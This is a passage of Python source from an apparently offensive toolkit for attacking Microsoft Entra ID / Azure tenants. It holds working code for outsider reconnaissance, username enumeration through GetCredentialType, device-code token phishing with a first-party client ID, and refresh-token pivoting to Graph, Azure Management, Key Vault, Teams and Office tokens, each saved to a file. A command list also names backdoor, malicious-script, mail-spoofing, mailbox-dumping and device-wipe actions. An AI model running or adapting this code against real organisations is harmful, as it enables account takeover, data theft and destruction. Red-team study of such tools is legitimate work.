        "get-userchatmessages", "get-administrativeunitmember", "get-onedrivefiles", "get-userpermissiongrants", "get-oauth2permissiongrants", 
        "get-messages", "get-temporaryaccesspassword", "get-password", "list-authmethods", "list-directoryroles", "list-notebooks", 
        "list-conditionalaccesspolicies", "list-conditionalauthenticationcontexts", "list-conditionalnamedlocations", "list-sharepointroot", 
        "list-sharepointsites","list-sharepointurls", "list-externalconnections", "list-applications", "list-serviceprincipals", "list-tenants", "list-joinedteams", 
        "list-chats", "list-chatmessages", "list-devices", "list-administrativeunits", "list-onedrives", "list-recentonedrivefiles", "list-onedriveurls",
        "list-sharedonedrivefiles", "invoke-customquery", "invoke-search", "find-privilegedroleusers", "find-updatablegroups", "find-dynamicgroups","find-securitygroups", 
        "locate-objectid", "update-userpassword", "add-applicationpassword", "add-usertap", "add-groupmember", "create-application", 
        "create-newuser", "invite-guestuser", "assign-privilegedrole", "open-owamailboxinbrowser", "dump-owamailbox", "spoof-owaemailmessage", 
        "delete-user", "delete-group", "remove-groupmember", "delete-application", "delete-device", "wipe-device", "retire-device",
        "get-manageddevices", "get-userdevices", "get-caps", "get-devicecategories", "get-devicecompliancepolicies", "update-deviceconfig",
        "get-devicecompliancesummary", "get-deviceconfigurations", "get-deviceconfigurationpolicies", "get-deviceconfigurationpolicysettings", 
        "get-deviceenrollmentconfigurations", "get-devicegrouppolicyconfigurations","update-userproperties", "dump-windowsapps", "dump-iosapps", "dump-androidapps",
        "get-devicegrouppolicydefinition", "dump-devicemanagementscripts", "get-scriptcontent", "find-privilegedapplications", "dump-macosapps",
        "get-roledefinitions", "get-roleassignments", "display-avpolicyrules", "display-asrpolicyrules", "display-diskencryptionpolicyrules", 
        "display-firewallrulepolicyrules", "display-lapsaccountprotectionpolicyrules", "display-usergroupaccountprotectionpolicyrules", "get-appserviceprincipal",
        "display-edrpolicyrules","add-exclusiongrouptopolicy", "deploy-maliciousscript", "reboot-device", "shutdown-device", "lock-device", "backdoor-script",
        "add-applicationpermission", "new-signedjwt", "add-applicationcertificate", "get-application", "locate-permissionid", "get-serviceprincipal", "grant-appadminconsent"
    ]


    properties = [
        "aboutMe", "accountEnabled", "ageGroup", "assignedLicenses", "assignedPlans", 
        "birthday", "businessPhones", "city", "companyName", "consentProvidedForMinor", 
        "country", "createdDateTime", "department", "displayName", "employeeId", 
        "faxNumber", "givenName", "hireDate", "id", "imAddresses", "interests", 
        "isResourceAccount", "jobTitle", "lastPasswordChangeDateTime", "legalAgeGroupClassification", 
        "licenseAssignmentStates", "mail", "mailboxSettings", "mailNickname", "mobilePhone", 
        "mySite", "officeLocation", "onPremisesDistinguishedName", "onPremisesDomainName", 
        "onPremisesImmutableId", "onPremisesLastSyncDateTime", "onPremisesSecurityIdentifier", 
        "onPremisesSyncEnabled", "onPremisesSamAccountName", "onPremisesUserPrincipalName", 
        "otherMails", "passwordPolicies", "passwordProfile", "pastProjects", "preferredDataLocation", 
        "preferredLanguage", "preferredName", "proxyAddresses", "responsibilities", 
        "schools", "showInAddressList", "skills", "state", "streetAddress", 
        "surname", "usageLocation", "userPrincipalName", "userType", "webUrl"
    ]

    roles = [
        {"displayName": "Password Administrator", "roleTemplateId": "966707d0-3269-4727-9be2-8c3a10f19b9d", "description": "Can reset passwords for non-administrators and Password Administrators."},
        {"displayName": "Global Reader", "roleTemplateId": "f2ef992c-3afb-46b9-b7cf-a126ee74c451", "description": "Can read everything that a Global Administrator can, but not update anything."},
        {"displayName": "Directory Synchronization Accounts", "roleTemplateId": "d29b2b05-8046-44ba-8758-1e26182fcf32", "description": "Only used by Microsoft Entra Connect and Microsoft Entra Cloud Sync services."},
        {"displayName": "Security Reader", "roleTemplateId": "5d6b6bb7-de71-4623-b4af-96380a352509", "description": "Can read security information and reports in Microsoft Entra ID and Office 365."},
        {"displayName": "Privileged Authentication Administrator", "roleTemplateId": "7be44c8a-adaf-4e2a-84d6-ab2649e08a13", "description": "Can access to view, set and reset authentication method information for any user (admin or non-admin)."},
        {"displayName": "Azure AD Joined Device Local Administrator", "roleTemplateId": "9f06204d-73c1-4d4c-880a-6edb90606fd8", "description": "Users with this role can locally administer Azure AD joined devices."},
        {"displayName": "Authentication Administrator", "roleTemplateId": "c4e39bd9-1100-46d3-8c65-fb160da0071f", "description": "Can access to view, set and reset authentication method information for any non-admin user."},
        {"displayName": "Groups Administrator", "roleTemplateId": "fdd7a751-b60b-444a-984c-02652fe8fa1c", "description": "Can manage all aspects of groups and group settings like naming and expiration policies."},
        {"displayName": "Application Administrator", "roleTemplateId": "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3", "description": "Can create and manage all aspects of app registrations and enterprise apps."},
        {"displayName": "Helpdesk Administrator", "roleTemplateId": "729827e3-9c14-49f7-bb1b-9608f156bbb8", "description": "Can reset passwords for non-administrators and Helpdesk Administrators."},
        {"displayName": "Directory Readers", "roleTemplateId": "88d8e3e3-8f55-4a1e-953a-9b9898b8876b", "description": "Can read basic directory information. Not intended for granting access to applications."},
        {"displayName": "User Administrator", "roleTemplateId": "fe930be7-5e62-47db-91af-98c3a49a38b1", "description": "Can manage all aspects of users and groups, including resetting passwords for limited admins."},
        {"displayName": "Global Administrator", "roleTemplateId": "62e90394-69f5-4237-9190-012177145e10", "description": "Can manage all aspects of Microsoft Entra ID and Microsoft services that use Microsoft Entra identities."},
        {"displayName": "Intune Administrator", "roleTemplateId": "3a2c62db-5318-420d-8d74-23affee5d9d5", "description": "Can manage all aspects of the Intune product."},
        {"displayName": "Application Developer", "roleTemplateId": "cf1c38e5-3621-4004-a7cb-879624dced7c", "description": "Can create application registrations independent of the 'Users can register applications' setting."},
        {"displayName": "Authentication Extensibility Administrator", "roleTemplateId": "25a516ed-2fa0-40ea-a2d0-12923a21473a", "description": "Customize sign in and sign up experiences for users by creating and managing custom authentication extensions."},
        {"displayName": "B2C IEF Keyset Administrator", "roleTemplateId": "aaf43236-0c0d-4d5f-883a-6955382ac081", "description": "Can manage secrets for federation and encryption in the Identity Experience Framework (IEF)."},
        {"displayName": "Cloud Application Administrator", "roleTemplateId": "158c047a-c907-4556-b7ef-446551a6b5f7", "description": "Can create and manage all aspects of app registrations and enterprise apps except App Proxy."},
        {"displayName": "Cloud Device Administrator", "roleTemplateId": "7698a772-787b-4ac8-901f-60d6b08affd2", "description": "Limited access to manage devices in Microsoft Entra ID."},
        {"displayName": "Conditional Access Administrator", "roleTemplateId": "b1be1c3e-b65d-4f19-8427-f6fa0d97feb9", "description": "Can manage Conditional Access capabilities."},
        {"displayName": "Directory Writers", "roleTemplateId": "9360feb5-f418-4baa-8175-e2a00bac4301", "description": "Can read and write basic directory information. For granting access to applications, not intended for users."},
        {"displayName": "Domain Name Administrator", "roleTemplateId": "8329153b-31d0-4727-b945-745eb3bc5f31", "description": "Can manage domain names in cloud and on-premises."},
        {"displayName": "External Identity Provider Administrator", "roleTemplateId": "be2f45a1-457d-42af-a067-6ec1fa63bc45", "description": "Can configure identity providers for use in direct federation."},
        {"displayName": "Hybrid Identity Administrator", "roleTemplateId": "8ac3fc64-6eca-42ea-9e69-59f4c7b60eb2", "description": "Manage Active Directory to Microsoft Entra cloud provisioning, Microsoft Entra Connect, pass-through authentication (PTA), password hash synchronization (PHS), seamless single sign-on (seamless SSO), and federation settings. Does not have access to manage Microsoft Entra Connect Health."},
        {"displayName": "Lifecycle Workflows Administrator", "roleTemplateId": "59d46f88-662b-457b-bceb-5c3809e5908f", "description": "Create and manage all aspects of workflows and tasks associated with Lifecycle Workflows in Microsoft Entra ID."},
        {"displayName": "Privileged Role Administrator", "roleTemplateId": "e8611ab8-c189-46e8-94e1-60213ab1f814", "description": "Can manage role assignments in Microsoft Entra ID, and all aspects of Privileged Identity Management."},
        {"displayName": "Security Administrator", "roleTemplateId": "194ae4cb-b126-40b2-bd5b-6091b380977d", "description": "Can read security information and reports, and manage configuration in Microsoft Entra ID and Office 365."},
        {"displayName": "Security Operator", "roleTemplateId": "5f2222b1-57c3-48ba-8ad5-d4759f1fde6f", "description": "Creates and manages security events."}
    ]

    if args.list_commands:
        list_commands()
        return

    if args.command and args.command.lower() in [
            "invoke-refreshtomsgraphtoken", "invoke-refreshtoazuremanagementtoken",
            "invoke-refreshtovaulttoken", "invoke-refreshtomsteamstoken", 
            "invoke-refreshtoofficeappstoken", "invoke-refreshtoofficemanagementtoken",
            "invoke-refreshtooutlooktoken","invoke-refreshtosubstratetoken", "invoke-refreshtoyammertoken", 
            "invoke-refreshtointuneenrollmenttoken", "invoke-refreshtoonedrivetoken", "invoke-refreshtosharepointtoken",
            "get-tokenscope", "decode-accesstoken", "get-manageddevices", "get-userdevices", "get-user", 
            "get-userproperties", "get-userprivileges", "get-usertransitivegroupmembership", "get-group", 
            "get-groupmember", "get-userapproleassignments", "get-conditionalaccesspolicy", "get-personalcontacts", 
            "get-crosstenantaccesspolicy", "get-partnercrosstenantaccesspolicy", "get-userchatmessages", 
            "get-administrativeunitmember", "get-onedrivefiles", "get-userpermissiongrants", "get-oauth2permissiongrants", 
            "get-messages", "get-temporaryaccesspassword", "get-password", "get-currentuser", 
            "get-currentuseractivities", "get-orginfo", "get-domains", "list-authmethods", "list-directoryroles", 
            "list-notebooks", "list-conditionalaccesspolicies", "list-conditionalauthenticationcontexts", 
            "list-conditionalnamedlocations", "list-sharepointroot", "list-sharepointsites", "list-sharepointurls","list-externalconnections", 
            "list-applications", "list-serviceprincipals", "list-tenants", "list-joinedteams", "list-chats", 
            "list-chatmessages", "list-devices", "list-administrativeunits", "list-onedrives", "list-recentonedrivefiles", "list-onedriveurls",
            "list-sharedonedrivefiles", "invoke-customquery", "invoke-search", "find-privilegedroleusers", 
            "find-updatablegroups", "find-dynamicgroups","find-securitygroups", "locate-objectid", "update-userpassword", "add-applicationpassword", 
            "add-usertap", "add-groupmember", "create-application", "create-newuser", "invite-guestuser", "update-deviceconfig",
            "assign-privilegedrole", "open-owamailboxinbrowser", "dump-owamailbox", "spoof-owaemailmessage", "dump-androidapps",
            "delete-user", "delete-group", "remove-groupmember", "delete-application", "delete-device", "wipe-device", "retire-device",
            "get-caps", "get-devicecategories", "display-devicecompliancepolicies", "get-devicecompliancesummary", "dump-macosapps",
            "get-deviceconfigurations", "get-deviceconfigurationpolicies", "get-deviceconfigurationpolicysettings", "dump-iosapps",
            "get-deviceenrollmentconfigurations", "get-devicegrouppolicyconfigurations", "grant-appadminconsent", "dump-windowsapps",
            "get-devicegrouppolicydefinition", "dump-devicemanagementscripts", "update-userproperties", "find-privilegedapplications",
            "get-scriptcontent", "get-roledefinitions", "get-roleassignments", "display-avpolicyrules","get-appserviceprincipal",
            "display-asrpolicyrules", "display-diskencryptionpolicyrules", "display-firewallrulepolicyrules", "backdoor-script",
            "display-edrpolicyrules", "display-lapsaccountprotectionpolicyrules", "display-usergroupaccountprotectionpolicyrules", 
            "add-exclusiongrouptopolicy","deploy-maliciousscript", "reboot-device", "add-applicationpermission", "new-signedjwt",
            "add-applicationcertificate", "get-application", "get-serviceprincipal", "get-serviceprincipalapproleassignments"]:
        if not args.token:
            print_red(f"[-] Error: --token is required for command")
            return

        access_token = get_access_token(args.token)

    elif args.command and args.command.lower() not in available_commands:
        print_red(f"[-] Error: Unknown command '{args.command}'. Use --list-commands to see available commands")


    ############
    # Outsider #
    ############
    
    # invoke-reconasoutsider
    elif args.command and args.command.lower() == "invoke-reconasoutsider":
        if not args.domain:
            print_red("[-] Error: --domain argument is required for Invoke-ReconAsOutsider command")
            return

        print_yellow("\n[*] Invoke-ReconAsOutsider")
        print("=" * 80)
        domain = args.domain

        # get tenant id
        tenant_id = ""
        try:
            response = requests.get(f"https://login.microsoftonline.com/{domain}/.well-known/openid-configuration")
            if response.status_code == 200:
                tenant_id = response.json().get('token_endpoint', '').split('/')[3]
        except:
            print_red("[-] Failed to retrieve tenant ID")

        if not tenant_id:
            print_red(f"[-] Domain {domain} is not registered to Azure AD")
            print("=" * 80)
            return

        tenant_name = ""
        tenant_brand = ""
        tenant_region = ""
        tenant_sso = ""

        # tenant info
        try:
            response = requests.get(f"https://login.microsoftonline.com/{domain}/.well-known/openid-configuration")
            if response.status_code == 200:
                data = response.json()
                tenant_region = data.get('tenant_region_scope', "Unknown")
        except:
            print_red("[-] Failed to retrieve tenant info")

        
        additional_domains = get_tenant_domains(domain)
        additional_domains_count = len(additional_domains)
        print(f"Domains: {additional_domains_count}")
        domain_information = []

        # show progress bar
        custom_bar = '╢{bar:50}╟'
        for domain in tqdm((additional_domains),bar_format='{l_bar}'+custom_bar+'{r_bar}', leave=False, colour='yellow'):
            if domain.lower().endswith('.onmicrosoft.com') and not tenant_name:
                tenant_name = domain

            # desktop sso
            if not tenant_sso:
                try:
                    url = f"https://autologon.microsoftazuread-sso.com/{domain}/winauth/trust/2005/usernamemixed?client-request-id={'0' * 32}"
                    response = requests.get(url)
                    tenant_sso = response.status_code == 401
                except:
                    pass

            # DNS checks
            exists = False
            has_cloud_mx = False
            has_cloud_spf = False
            has_dmarc = False
            has_cloud_dkim = False
            has_cloud_mta_sts = False

            try:
                dns.resolver.resolve(domain)
                exists = True
            except:
                pass

            if exists:
                try:
                    mx_records = dns.resolver.resolve(domain, 'MX')
                    has_cloud_mx = any('mail.protection.outlook.com' in str(mx.exchange) for mx in mx_records)
                except:
                    pass

                try:
                    txt_records = dns.resolver.resolve(domain, 'TXT')
                    has_cloud_spf = any('v=spf1' in str(record) and 'include:spf.protection.outlook.com' in str(record) for record in txt_records)
                except:
                    pass

                try:
                    dmarc_records = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
                    has_dmarc = any('v=DMARC1' in str(record) for record in dmarc_records)
                except:
                    pass

                try:
                    selectors = ["selector1", "selector2"]
                    for selector in selectors:
                        dkim_records = dns.resolver.resolve(f'{selector}._domainkey.{domain}', 'CNAME')
                        has_cloud_dkim = any('onmicrosoft.com' in str(record) for record in dkim_records)
                        if has_cloud_dkim:
                            break
                except:
                    pass

                try:
                    url = f"https://mta-sts.{domain}/.well-known/mta-sts.txt"
                    mta_sts_response = requests.get(url)
                    if mta_sts_response.status_code == 200:
                        mta_sts_content = mta_sts_response.text
                        mta_sts_lines = mta_sts_content.split("\n")
                        has_cloud_mta_sts = any("version: STSv1" in line for line in mta_sts_lines) and any("mx: *.mail.protection.outlook.com" in line for line in mta_sts_lines)
                except:
                    pass

            # federation info
            user_realm = {}
            try:
                username = f"nn@{domain}"
                response = requests.get(f"https://login.microsoftonline.com/GetUserRealm.srf?login={username}")
                if response.status_code == 200:
                    user_realm = response.json()
            except:
                print_red("[-] Failed to retrieve user realm information") # pass

            if not tenant_brand:
                tenant_brand = user_realm.get("FederationBrandName", "")

            auth_url = user_realm.get("AuthURL")
            if auth_url:
                auth_url = auth_url.split('?')[0]

            domain_info = {
                "Name": domain,
                "DNS": exists,
                "MX": has_cloud_mx,
                "SPF": has_cloud_spf,
                "DMARC": has_dmarc,
                "DKIM": has_cloud_dkim,
                "MTA-STS": has_cloud_mta_sts,
                "Type": user_realm.get("NameSpaceType", "Unknown"),
                "STS": auth_url
            }

            domain_information.append(domain_info)

        print(f"Tenant brand:       {tenant_brand}")
        print(f"Tenant name:        {tenant_name}")
        print(f"Tenant id:          {tenant_id}")
        print(f"Tenant region:      {tenant_region}")

        if tenant_sso is not None:
            print(f"DesktopSSO enabled: {tenant_sso}")

        if tenant_name:
            # check MDI instance
            tenant = tenant_name.split('.')[0] if '.' in tenant_name else tenant_name

            mdi_domains = [
                f"{tenant}.atp.azure.com",
                f"{tenant}-onmicrosoft-com.atp.azure.com"
            ]

            tenant_mdi = None
            for mdi_domain in mdi_domains:
                try:
                    dns.resolver.resolve(mdi_domain)
                    tenant_mdi = mdi_domain
                    break
                except dns.resolver.NXDOMAIN:
                    continue
                except Exception as e:
                    print(f"An error occurred while resolving {mdi_domain}: {str(e)}")

            if tenant_mdi:
                print(f"MDI instance:       {tenant_mdi}")
            else:
                print("MDI instance:       Not found")

        # check cloud sync
        if tenant_name:
            sync_service_account = f"ADToAADSyncServiceAccount@{tenant_name}"
            exists = None
            try:
                url = "https://login.microsoftonline.com/common/GetCredentialType"
                data = {
                    "username": sync_service_account,
                    "isOtherIdpSupported": True,
                    "checkPhones": False,
                    "isRemoteNGCSupported": True,
                    "isCookieBannerShown": False,
                    "isFidoSupported": True,
                    "originalRequest": "",
                    "country": "US",
                    "forceotclogin": False,
                    "isExternalFederationDisallowed": False,
                    "isRemoteConnectSupported": False,
                    "federationFlags": 0,
                    "isSignup": False,
                    "flowToken": "",
                    "isAccessPassSupported": True
                }
                response = requests.post(url, json=data)
                if response.status_code == 200:
                    result = response.json()
                    exists = result.get('IfExistsResult', 0) == 0
            except:
                pass

            uses_cloud_sync = exists
            print(f"Uses cloud sync:    {uses_cloud_sync}")

        print("\nName                                       DNS   MX    SPF    DMARC   DKIM   MTA-STS  Type        STS")
        print("----                                       ---   ---   ----   -----   ----   -------  ----        ---")
        for domain_info in domain_information:
            print(f"{domain_info['Name']:<42} {str(domain_info['DNS']):<5} {str(domain_info['MX']):<5} {str(domain_info['SPF']):<6} {str(domain_info['DMARC']):<7} {str(domain_info['DKIM']):<6} {str(domain_info['MTA-STS']):<8} {domain_info['Type']:<11} {domain_info['STS'] or ''}")

        print("=" * 80)

    # invoke-userenumerationasoutsider
    # - only uses Normal method from Killchain.ps1
    elif args.command and args.command.lower() == "invoke-userenumerationasoutsider":
        if not args.username:
            print_red("[-] Error: --username argument is required for Invoke-UserEnumerationAsOutsider command")
            return
        
        print_yellow("\n[*] Invoke-UserEnumerationAsOutsider")
        print("=" * 80)
        usernames = []

        if os.path.isfile(args.username):
            with open(args.username, 'r') as file:
                usernames = [line.strip() for line in file if line.strip()]
        else:
            usernames = [args.username]
     
        for username in usernames:
            exists = None
            try:
                url = "https://login.microsoftonline.com/common/GetCredentialType"
                data = {
                    "username": username,
                    "isOtherIdpSupported": True,
                    "checkPhones": False,
                    "isRemoteNGCSupported": True,
                    "isCookieBannerShown": False,
                    "isFidoSupported": True,
                    "originalRequest": "",
                    "country": "US",
                    "forceotclogin": False,
                    "isExternalFederationDisallowed": False,
                    "isRemoteConnectSupported": False,
                    "federationFlags": 0,
                    "isSignup": False,
                    "flowToken": "",
                    "isAccessPassSupported": True
                }
                response = requests.post(url, json=data)
                if response.status_code == 200:
                    result = response.json()
                    exists = result.get('IfExistsResult', 0) == 0
            except:
                pass
            
            if exists:
                print_green(f"[+] {username:<16}")# : {exists}")
            else:
                print_red(f"[-] {username:<16}")# : {exists}")
        print("=" * 80)


    ##################
    # Authentication #
    ##################

    # get-graphtokens
    if args.command and args.command.lower() == "get-graphtokens":
        print_yellow("\n[*] Get-GraphTokens")
        print("=" * 80)
        client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        resource = "https://graph.microsoft.com"
        user_agent = get_user_agent(args) 

        body = {
            "client_id": client_id,
            "resource": resource
        }

        headers = {
            "User-Agent": user_agent
        }

        device_code_response = requests.post("https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0", data=body, headers=headers)
        device_code_response_content = device_code_response.content.decode()

        device_code = None
        message = None
        try:
            device_code_json_response = json.loads(device_code_response_content)
            device_code = device_code_json_response["device_code"]
            message = device_code_json_response["message"]
        except Exception as ex:
            print_red(f"[-] Failed to parse device code response: {ex}")
            exit()

        print(f"{message}\n")

        time.sleep(3)

        start_time = datetime.now()
        polling_duration = timedelta(minutes=15)
        last_authorization_pending_time = datetime.min

        while datetime.now() - start_time < polling_duration:
            token_body = {
                "client_id": client_id,
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "code": device_code
            }

            token_response = requests.post("https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0", data=token_body)
            token_response_content = token_response.content.decode()

            if token_response.status_code == 400:
                if datetime.now() - last_authorization_pending_time >= timedelta(minutes=1):
                    print("[*] authorization_pending")
                    last_authorization_pending_time = datetime.now()
                time.sleep(3)
            elif not token_response.ok or "authorization_pending" in token_response_content:
                # continue polling
                time.sleep(3)
            else:
                token_json = json.loads(token_response_content)
                print_green("\n[+] Token Obtained!\n")

                for key, value in token_json.items():
                    print(f"[*] {key}: {value}")

                file_path = "graph_tokens.txt"
                with open(file_path, "a") as writer:
                    writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                    for key, value in token_json.items():
                        writer.write(f"[*] {key}: {value}\n")
                    writer.write("\n")
                print_green(f"\n[+] Token information written to '{file_path}'.")

                exit()

        print_red("[-] Polling expired. Token not obtained.")
        print("=" * 80)

    # get-tenantid
    elif args.command and args.command.lower() == "get-tenantid":
        if not args.domain:
            print_red("[-] Error: --domain argument is required for Get-TenantID command")
            return

        print_yellow("\n[*] Get-TenantID")
        print("=" * 80)
        try:
            response = requests.get(f"https://login.microsoftonline.com/{args.domain}/.well-known/openid-configuration")
            response.raise_for_status()
            response_content = response.content.decode()

            open_id_config = json.loads(response_content)
            tenant_id = open_id_config["authorization_endpoint"].split('/')[3]

            print(tenant_id)
        except requests.exceptions.RequestException as ex:
            print_red(f"[-] Error retrieving OpenID configuration: {ex}")
        print("=" * 80)


    # get-tokenscope
    elif args.command and args.command.lower() == "get-tokenscope":
        print_yellow("\n[*] Get-TokenScope")
        print("=" * 80)
        try:
            json_token = jwt.decode(access_token, options={"verify_signature": False})
            scope = json_token.get("scp")

            if scope:
                scope_array = scope.split(' ')

                for s in scope_array:
                    print(s)
            else:
                print_red("[-] No scopes found in the access token")
        except jwt.DecodeError:
            print_red("[-] Invalid access token format")
        print("=" * 80)

    # decode-accesstoken
    elif args.command and args.command.lower() == "decode-accesstoken":
        print_yellow("\n[*] Decode-AccessToken")
        print("=" * 80)
        try:
            json_token = jwt.decode(access_token, options={"verify_signature": False})

            for key, value in json_token.items():
                print(f"{key}: {value}")

        except jwt.DecodeError:
            print_red("[-] Invalid access token format")
        print("=" * 80)


    # invoke-refreshtomsgraphtoken
    elif args.command and args.command.lower() == "invoke-refreshtomsgraphtoken":
        if not args.tenant:
            print_red("[-] Error: --tenant argument is required for Invoke-RefreshToMSGraphToken command")
            return

        print_yellow("\n[*] Invoke-RefreshToMSGraphToken")
        print("=" * 80)
        user_agent = get_user_agent(args)
        client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        refresh_token = access_token
        resource = "https://graph.microsoft.com/"
        auth_url = f"https://login.microsoftonline.com/{args.tenant}"

        headers = {
            "User-Agent": user_agent
        }

        body = {
            "resource": resource,
            "client_id": client_id,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "scope": "openid"
        }

        if args.use_cae:
            claims = json.dumps({
                "access_token": {
                    "xms_cc": {
                        "values": ["cp1"]
                    }
                }
            }, separators=(',', ':'))
            body["claims"] = claims

        response = requests.post(f"{auth_url}/oauth2/token?api-version=1.0", data=body, headers=headers)

        if response.status_code == 200:
            print_green("[+] Token Obtained!\n")

            token_response = response.json()
            for key, value in token_response.items():
                print(f"[*] {key}: {value}")

            file_path = "new_graph_tokens.txt"
            with open(file_path, "a") as writer:
                writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                for key, value in token_response.items():
                    writer.write(f"[*] {key}: {value}\n")
                writer.write("\n")
            print_green(f"\n[+] Token information written to '{file_path}'.")
        else:
            print_red(f"[-] Failed to get Microsoft Graph token: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # invoke-refreshttoazuremanagementtoken
    elif args.command and args.command.lower() == "invoke-refreshtoazuremanagementtoken":
        if not args.tenant:
            print_red("[-] Error: --tenant argument is required for Invoke-RefreshToAzureManagementToken command")
            return

        print_yellow("\n[*] Invoke-RefreshToAzureManagementToken")
        print("=" * 80)
        user_agent = get_user_agent(args)
        client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        refresh_token = access_token
        resource = "https://management.azure.com/"
        auth_url = f"https://login.microsoftonline.com/{args.tenant}"

        headers = {
            "User-Agent": user_agent
        }

        body = {
            "resource": resource,
            "client_id": client_id,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "scope": "openid"
        }

        if args.use_cae:
            claims = json.dumps({
                "access_token": {
                    "xms_cc": {
                        "values": ["cp1"]
                    }
                }
            }, separators=(',', ':'))
            body["claims"] = claims

        response = requests.post(f"{auth_url}/oauth2/token?api-version=1.0", data=body, headers=headers)

        if response.status_code == 200:
            print_green("[+] Token Obtained!\n")

            token_response = response.json()
            for key, value in token_response.items():
                print(f"[*] {key}: {value}")

            file_path = "az_tokens.txt"
            with open(file_path, "a") as writer:
                writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                for key, value in token_response.items():
                    writer.write(f"[*] {key}: {value}\n")
                writer.write("\n")
            print_green(f"\n[+] Token information written to '{file_path}'.")
        else:
            print_red(f"[-] Failed to get Azure Management token: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # invoke-refreshtovaulttoken
    elif args.command and args.command.lower() == "invoke-refreshtovaulttoken":
        if not args.tenant:
            print_red("[-] Error: --tenant argument is required for Invoke-RefreshToAzureManagementToken command")
            return

        print_yellow("\n[*] Invoke-RefreshToVaultToken")
        print("=" * 80)
        user_agent = get_user_agent(args)
        client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        refresh_token = access_token
        scope = "https://vault.azure.net/.default"
        auth_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

        headers = {
            "User-Agent": user_agent
        }

        data = {
            "client_id": client_id,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "scope": scope
        }

        try:
            response = requests.post(auth_url, data=data, headers=headers)
            response.raise_for_status()
            print_green("[+] Token Obtained!\n")

            token_json = response.json()
            for key, value in token_json.items():
                print(f"[*] {key}: {value}")

            file_path = "vault_tokens.txt"
            with open(file_path, 'a') as writer:
                writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                for key, value in token_json.items():
                    writer.write(f"[*] {key}: {value}\n")
                writer.write("\n")

            print_green(f"\n[+] Token information written to '{file_path}'.")

        except requests.exceptions.RequestException as e:
            print_red(f"[-] Failed to get Azure Vault token: {str(e)}")
            print_red(response.text)
        print("=" * 80)

    # invoke-refreshtomsteamstoken
    elif args.command and args.command.lower() == "invoke-refreshtomsteamstoken":
        if not args.tenant:
            print_red("[-] Error: --tenant argument is required for Invoke-RefreshToMSTeamsToken command")
            return

        print_yellow("\n[*] Invoke-RefreshToMSTeamsToken")
        print("=" * 80)
        user_agent = get_user_agent(args)
        client_id = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
        refresh_token = access_token
        resource = "https://api.spaces.skype.com/"
        auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
        scope = "openid"

        headers = {
            "User-Agent": user_agent
        }

        data = {
            "resource": resource,
            "client_id": client_id,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "scope": scope
        }

        if args.use_cae:
            claims = json.dumps({
                "access_token": {
                    "xms_cc": {
                        "values": ["cp1"]
                    }
                }
            }, separators=(',', ':'))
            data["claims"] = claims
        
        try:
            response = requests.post(auth_url, data=data, headers=headers)
            response.raise_for_status()
            print_green("[+] Token Obtained!\n")

            token_json = response.json()
            for key, value in token_json.items():
                print(f"[*] {key}: {value}")

            file_path = "teams_tokens.txt"
            with open(file_path, 'a') as writer:
                writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                for key, value in token_json.items():
                    writer.write(f"[*] {key}: {value}\n")
                writer.write("\n")

            print_green(f"\n[+] Token information written to '{file_path}'.")

        except requests.exceptions.RequestException as e:
            print_red(f"[-] Failed to get MS Teams token: {str(e)}")
            print_red(response.text)
        print("=" * 80)

    # invoke-refreshtoofficeappstoken
    elif args.command and args.command.lower() == "invoke-refreshtoofficeappstoken":
        if not args.tenant:
            print_red("[-] Error: --tenant argument is required for Invoke-RefreshToOfficeAppsToken command")
            return

        print_yellow("\n[*] Invoke-RefreshToOfficeAppsToken")
        print("=" * 80)
        user_agent = get_user_agent(args)
        client_id = "ab9b8c07-8f02-4f72-87fa-80105867a763"
        refresh_token = access_token
        resource = "https://officeapps.live.com/"
        auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
        scope = "openid"

        headers = {
            "User-Agent": user_agent
        }

        data = {
            "resource": resource,
            "client_id": client_id,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "scope": scope
        }

        if args.use_cae:
            claims = json.dumps({
                "access_token": {
                    "xms_cc": {
                        "values": ["cp1"]
                    }
                }
            }, separators=(',', ':'))
            data["claims"] = claims

        try:
            response = requests.post(auth_url, data=data, headers=headers)
            response.raise_for_status()
            print_green("[+] Token Obtained!\n")

            token_json = response.json()
            for key, value in token_json.items():
                print(f"[*] {key}: {value}")

            file_path = "officeapps_tokens.txt"
            with open(file_path, 'a') as writer:
                writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                for key, value in token_json.items():
                    writer.write(f"[*] {key}: {value}\n")
                writer.write("\n")

            print_green(f"\n[+] Token information written to '{file_path}'.")

        except requests.exceptions.RequestException as e:
            print_red(f"[-] Failed to get Office Apps token: {str(e)}")
            print_red(response.text)
        print("=" * 80)

    # invoke-refreshtoofficemanagementtoken
    elif args.command and args.command.lower() == "invoke-refreshtoofficemanagementtoken":
        if not args.tenant:
            print_red("[-] Error: --tenant argument is required for Invoke-RefreshToOfficeManagementToken command")
            return

        print_yellow("\n[*] Invoke-RefreshToOfficeManagementToken")
        print("=" * 80)
        user_agent = get_user_agent(args)
        client_id = "00b41c95-dab0-4487-9791-b9d2c32c80f2"
        refresh_token = access_token
        resource = "https://manage.office.com/"
        auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
        scope = "openid"

        headers = {
            "User-Agent": user_agent
        }

        data = {
            "resource": resource,
